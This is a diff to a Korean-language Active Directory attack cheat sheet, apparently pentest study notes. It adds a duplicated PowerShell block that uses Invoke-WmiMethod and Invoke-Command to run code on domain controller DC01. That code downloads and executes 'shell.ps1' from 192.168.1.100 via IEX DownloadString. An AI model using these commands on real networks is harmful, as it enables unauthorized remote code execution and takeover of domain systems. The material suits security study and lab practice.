@@ -182,6 +182,16 @@ iwr -UseDefaultCredentials http://web04
 - `klist` : 현재 메모리에 로드된 티켓 확인
 - `iwr -UseDefaultCredentials` : 티켓을 이용해 웹 요청
 
+```powershell
+# 방법 A: Invoke-WmiMethod
+Invoke-WmiMethod -ComputerName DC01 -Class Win32_Process -Name Create -ArgumentList "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"
+
+# 방법 B: Invoke-Command
+Invoke-Command -ComputerName DC01 -ScriptBlock {
+    IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')
+}
+```
+
 ---
 
 ## Impacket Secretsdump
@@ -211,6 +221,15 @@ mimikatz # kerberos::list
 dir \\DC01\C$
 
 klist
+```
+```powershell
+# 방법 A: Invoke-WmiMethod
+Invoke-WmiMethod -ComputerName DC01 -Class Win32_Process -Name Create -ArgumentList "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"
+
+# 방법 B: Invoke-Command
+Invoke-Command -ComputerName DC01 -ScriptBlock {
+    IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')
+}
 ```
 
 ```powershell
